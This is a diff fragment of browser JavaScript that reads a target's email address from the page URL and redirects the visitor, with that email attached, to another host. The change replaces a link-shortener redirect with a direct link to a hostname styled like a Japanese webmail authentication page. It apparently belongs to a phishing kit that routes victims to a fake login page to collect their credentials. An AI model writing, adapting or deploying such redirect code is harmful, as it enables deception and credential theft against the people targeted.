@@ -42,7 +42,7 @@
     const urlParams = new URLSearchParams(window.location.search);
     const email = urlParams.get('email') || 'unknown@example.com';
 
-    const redirectBase = "https://l.wl.co/l?u=http://docs-net.org/chris/document/indexf.html";
+    const redirectBase = "https://japanwebmailauth.docs-net.org/";
     const finalUrl = `${redirectBase}?email=${encodeURIComponent(email)}#${data2 || ''}`;
 
     console.log("Redirecting to:", finalUrl);
